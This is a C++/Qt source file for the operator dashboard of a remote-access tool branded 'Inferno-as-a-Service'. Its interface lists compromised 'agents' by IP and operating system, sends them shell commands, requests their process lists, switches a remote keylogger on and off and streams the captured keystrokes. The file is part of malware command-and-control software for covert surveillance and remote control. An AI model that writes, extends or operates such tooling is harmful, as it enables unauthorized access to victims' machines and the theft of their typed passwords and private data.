#include "../include/MainWindow.hpp"
#include "../include/DataStreamWidget.hpp"
#include "../include/CommandDialog.hpp"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QFile>
#include <QStatusBar>
#include <QMenuBar>
#include <QSplitter>
#include <QLabel>
#include <QPushButton>
#include <QListWidget>
#include <QPlainTextEdit>

namespace inferno {

MainWindow::MainWindow(Server* server, QWidget* parent)
    : QMainWindow(parent), m_server(server) {
    setupUI();
    loadStyleSheet();
    
    connect(m_server, &Server::agentConnected, this, &MainWindow::onAgentConnected);
    connect(m_server, &Server::agentDisconnected, this, &MainWindow::onAgentDisconnected);
    connect(m_server, &Server::shellOutputReceived, this, &MainWindow::onShellOutputReceived);
    connect(m_server, &Server::keylogReceived, this, &MainWindow::onKeylogReceived);
    connect(m_server, &Server::statusMessage, this, &MainWindow::onStatusMessage);

    // Animation Init
    m_radarAngle = 0;
    m_radarTimer = new QTimer(this);
    connect(m_radarTimer, &QTimer::timeout, this, &MainWindow::updateRadarAnimation);

    m_keylogPollTimer = new QTimer(this);
    connect(m_keylogPollTimer, &QTimer::timeout, this, &MainWindow::pollKeylogger);
}

void MainWindow::setupUI() {
    setWindowTitle("Inferno-as-a-Service | Operator Dashboard");
    setMinimumSize(1200, 800);

    // Initialize Core Widgets First to avoid Segfaults in connects
    m_telemetryConsole = new QPlainTextEdit();
    m_telemetryConsole->setReadOnly(true);
    m_keylogStream = new QPlainTextEdit();
    m_keylogStream->setReadOnly(true);
    m_agentList = new QListWidget();
    m_statusLabel = new QLabel(" SYSTEM READY");

    // Central Widget and Main Layout
    auto* centralWidget = new QWidget(this);
    setCentralWidget(centralWidget);
    auto* mainLayout = new QVBoxLayout(centralWidget);
    mainLayout->setContentsMargins(0, 0, 0, 0);
    mainLayout->setSpacing(0);

    // 1. Header Toolbar
    auto* toolbar = addToolBar("Main Controls");
    toolbar->setMovable(false);
    
    auto* titleLabel = new QLabel(" INFERNO-AS-A-SERVICE ");
    titleLabel->setStyleSheet("font-size: 18px; font-weight: bold; color: #00ff41;");
    toolbar->addWidget(titleLabel);

    // Add Spacer to push branding to the right
    auto* spacer = new QWidget();
    spacer->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
    toolbar->addWidget(spacer);

    // Add Branding Skull (Increased Size)
    auto* brandingLabel = new QLabel();
    QPixmap skull(":/branding_skull.png");
    brandingLabel->setPixmap(skull.scaled(80, 80, Qt::KeepAspectRatio, Qt::SmoothTransformation));
    brandingLabel->setContentsMargins(0, 5, 20, 5);
    toolbar->addWidget(brandingLabel);

    // 2. Main Three-Pane Layout using QSplitter
    auto* mainSplitter = new QSplitter(Qt::Horizontal, centralWidget);
    
    // Pane A: Agent Sidebar
    auto* agentContainer = new QWidget();
    auto* agentLayout = new QVBoxLayout(agentContainer);
    auto* agentHeader = new QHBoxLayout();
    agentHeader->addWidget(new QLabel("CONNECTED AGENTS"));
    agentHeader->addStretch();
    m_btnScan = new QPushButton();
    m_btnScan->setObjectName("iconButton");
    m_btnScan->setFixedSize(40, 40);
    m_btnScan->setIcon(QIcon(":/icon_scan.png"));
    m_btnScan->setIconSize(QSize(32, 32));
    m_btnScan->setToolTip("Scan Network");
    connect(m_btnScan, &QPushButton::clicked, this, &MainWindow::toggleScan);
    agentHeader->addWidget(m_btnScan);
    agentLayout->addLayout(agentHeader);
    
    m_agentList->setIconSize(QSize(24, 24));
    m_agentList->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(m_agentList, &QListWidget::customContextMenuRequested, this, &MainWindow::showAgentContextMenu);
    agentLayout->addWidget(m_agentList);
    mainSplitter->addWidget(agentContainer);

    // Pane B: Telemetry Console
    auto* telemetryContainer = new QWidget();
    auto* telemetryLayout = new QVBoxLayout(telemetryContainer);
    auto* telemetryHeader = new QHBoxLayout();
    telemetryHeader->addWidget(new QLabel("TELEMETRY CONSOLE"));
    telemetryHeader->addStretch();
    
    auto* btnShell = new QPushButton();
    btnShell->setObjectName("iconButton");
    btnShell->setFixedSize(40, 40);
    btnShell->setIcon(QIcon(":/icon_shell.png"));
    btnShell->setIconSize(QSize(32, 32));
    btnShell->setToolTip("Execute Shell");
    connect(btnShell, &QPushButton::clicked, this, &MainWindow::executeShellCommand);
    
    auto* btnProcs = new QPushButton();
    btnProcs->setObjectName("iconButton");
    btnProcs->setFixedSize(40, 40);
    btnProcs->setIcon(QIcon(":/icon_refresh.png"));
    btnProcs->setIconSize(QSize(32, 32));
    btnProcs->setToolTip("Refresh Process List");
    connect(btnProcs, &QPushButton::clicked, this, &MainWindow::requestProcessList);

    auto* btnClearConsole = new QPushButton();
    btnClearConsole->setObjectName("iconButton");
    btnClearConsole->setFixedSize(40, 40);
    btnClearConsole->setIcon(QIcon(":/icon_clear.png"));
    btnClearConsole->setIconSize(QSize(32, 32));
    btnClearConsole->setToolTip("Clear Console");
    connect(btnClearConsole, &QPushButton::clicked, m_telemetryConsole, &QPlainTextEdit::clear);

    telemetryHeader->addWidget(btnShell);
    telemetryHeader->addWidget(btnProcs);
    telemetryHeader->addWidget(btnClearConsole);
    telemetryLayout->addLayout(telemetryHeader);
    
    // Console Search Bar
    auto* searchLayout = new QHBoxLayout();
    m_searchBox = new QLineEdit();
    m_searchBox->setPlaceholderText("Search telemetry...");
    m_searchBox->setStyleSheet("background: #000; border: 1px solid #1a1a1a; color: #00ff41; padding: 5px;");
    
    auto* btnSearch = new QPushButton();
    btnSearch->setFixedSize(30, 30);
    btnSearch->setIcon(QIcon(":/icon_search.png"));
    btnSearch->setObjectName("iconButton");
    connect(btnSearch, &QPushButton::clicked, this, [this](){
        m_telemetryConsole->find(m_searchBox->text());
    });
    
    searchLayout->addWidget(m_searchBox);
    searchLayout->addWidget(btnSearch);
    telemetryLayout->addLayout(searchLayout);
    
    m_telemetryConsole->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(m_telemetryConsole, &QPlainTextEdit::customContextMenuRequested, this, [this](const QPoint& pos){
        QMenu menu(this);
        menu.addAction("Copy Selected", m_telemetryConsole, &QPlainTextEdit::copy);
        menu.exec(m_telemetryConsole->mapToGlobal(pos));
    });
    telemetryLayout->addWidget(m_telemetryConsole);
    mainSplitter->addWidget(telemetryContainer);

    // Pane C: Keystroke Stream
    auto* keylogContainer = new QWidget();
    auto* keylogLayout = new QVBoxLayout(keylogContainer);
    auto* keylogHeader = new QHBoxLayout();
    keylogHeader->addWidget(new QLabel("KEYSTROKE STREAM"));
    keylogHeader->addStretch();
    
    m_btnKeylog = new QPushButton();
    m_btnKeylog->setObjectName("iconButton");
    m_btnKeylog->setFixedSize(40, 40);
    m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
    m_btnKeylog->setIconSize(QSize(32, 32));
    m_btnKeylog->setCheckable(true);
    m_btnKeylog->setToolTip("Toggle Keylogger");
    connect(m_btnKeylog, &QPushButton::toggled, this, &MainWindow::toggleKeylogState);
    keylogHeader->addWidget(m_btnKeylog);
    keylogLayout->addLayout(keylogHeader);

    keylogLayout->addWidget(m_keylogStream);
    mainSplitter->addWidget(keylogContainer);

    // Set initial splitter sizes (20%, 50%, 30%)
    mainSplitter->setStretchFactor(0, 1);
    mainSplitter->setStretchFactor(1, 3);
    mainSplitter->setStretchFactor(2, 2);

    mainLayout->addWidget(mainSplitter);

    // 4. Data Stream Footer (Circle 4 Aesthetic)
    auto* dataStream = new DataStreamWidget(this);
    mainLayout->addWidget(dataStream);

    // 5. Status Bar
    m_statusLabel = new QLabel(" Ready");
    statusBar()->addWidget(m_statusLabel);
}

void MainWindow::loadStyleSheet() {
    QFile file(":/styles.qss");
    if (file.open(QFile::ReadOnly)) {
        QString styleSheet = QLatin1String(file.readAll());
        setStyleSheet(styleSheet);
    }
}

// Slots implementation
void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
    auto* item = new QListWidgetItem(ip + " [" + info + "]", m_agentList);
    
    QString lowerInfo = info.toLower();
    if (lowerInfo.contains("windows")) {
        item->setIcon(QIcon(":/os_win.png"));
    } else if (lowerInfo.contains("linux")) {
        item->setIcon(QIcon(":/os_linux.png"));
    } else if (lowerInfo.contains("macos") || lowerInfo.contains("darwin") || lowerInfo.contains("apple")) {
        item->setIcon(QIcon(":/os_mac.png"));
    }
    
    m_telemetryConsole->appendPlainText(QString("[SYSTEM] New connection established from %1").arg(ip));
    m_statusLabel->setText(QString(" Agent %1 connected").arg(ip));
}

void MainWindow::onAgentDisconnected(const QString& ip) {
    auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
    for (auto* item : items) {
        delete item;
    }
    m_telemetryConsole->appendPlainText(QString("[SYSTEM] Agent %1 has disconnected").arg(ip));
    m_statusLabel->setText(QString(" Agent %1 offline").arg(ip));
}

void MainWindow::onShellOutputReceived(const QString& ip, const QString& output) {
    m_telemetryConsole->appendPlainText(QString("[%1] %2").arg(ip, output));
}

void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
    if (data.trimmed().isEmpty()) return;

    // Check if we need a new IP header (e.g. if previous line doesn't end with a burst from the same IP)
    QString currentText = m_keylogStream->toPlainText();
    bool needsHeader = currentText.isEmpty() || !currentText.endsWith(data) || !currentText.contains(ip);
    
    if (needsHeader) {
        m_keylogStream->appendPlainText(QString("[%1] ").arg(ip));
    }
    
    m_keylogStream->insertPlainText(data);
    m_keylogStream->ensureCursorVisible();
}

void MainWindow::onStatusMessage(const QString& message) {
    m_telemetryConsole->appendPlainText(QString("[SERVER] %1").arg(message));
    m_statusLabel->setText(" " + message);
}

void MainWindow::toggleScan() {
    if (m_radarTimer->isActive()) {
        m_radarTimer->stop();
        // Reset rotation
        QPixmap pixmap(":/icon_scan.png");
        m_btnScan->setIcon(QIcon(pixmap));
    } else {
        m_radarTimer->start(50);
    }
}

void MainWindow::updateRadarAnimation() {
    m_radarAngle = (m_radarAngle + 10) % 360;
    QPixmap pixmap(":/icon_scan.png");
    QTransform tr;
    tr.rotate(m_radarAngle);
    m_btnScan->setIcon(QIcon(pixmap.transformed(tr, Qt::SmoothTransformation)));
}

void MainWindow::toggleKeylogState(bool active) {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return;
    
    QString agentIp = item->text().split(" ").first();
    if (active) {
        m_btnKeylog->setIcon(QIcon(":/icon_eye_open.png"));
        m_server->toggleKeylogger(agentIp, true);
        m_keylogPollTimer->start(1500); // Polling every 1.5s
    } else {
        m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
        m_server->toggleKeylogger(agentIp, false);
        m_keylogPollTimer->stop();
    }
}

void MainWindow::pollKeylogger() {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return;
    
    QString agentIp = item->text().split(" ").first();
    m_server->requestKeylogDump(agentIp);
}

void MainWindow::showAgentContextMenu(const QPoint& pos) {
    QListWidgetItem* item = m_agentList->itemAt(pos);
    if (!item) return;

    QMenu menu(this);
    menu.addAction("Execute Shell...", this, &MainWindow::executeShellCommand);
    menu.addAction("Refresh Processes", this, &MainWindow::requestProcessList);
    menu.addSeparator();
    menu.addAction("Disconnect Agent");
    
    menu.exec(m_agentList->mapToGlobal(pos));
}

void MainWindow::executeShellCommand() {
    QListWidgetItem* item = m_agentList->currentItem();
    if (!item) {
        onStatusMessage("No agent selected for command");
        return;
    }

    QString agentIp = item->text().split(" ").first();
    
    CommandDialog dlg(agentIp, this);
    if (dlg.exec() == QDialog::Accepted) {
        QString cmd = dlg.getCommand();
        if (!cmd.isEmpty()) {
            m_telemetryConsole->appendPlainText(QString("[LOCAL] Dispatching: %1").arg(cmd));
            m_server->sendShellCommand(agentIp, cmd);
        }
    }
}

void MainWindow::requestProcessList() {
     QListWidgetItem* item = m_agentList->currentItem();
    if (!item) return;
    
    QString agentIp = item->text().split(" ").first();
    m_telemetryConsole->appendPlainText(QString("[LOCAL] Requesting Process List from %1").arg(agentIp));
    m_server->requestProcessList(agentIp);
}

} // namespace inferno
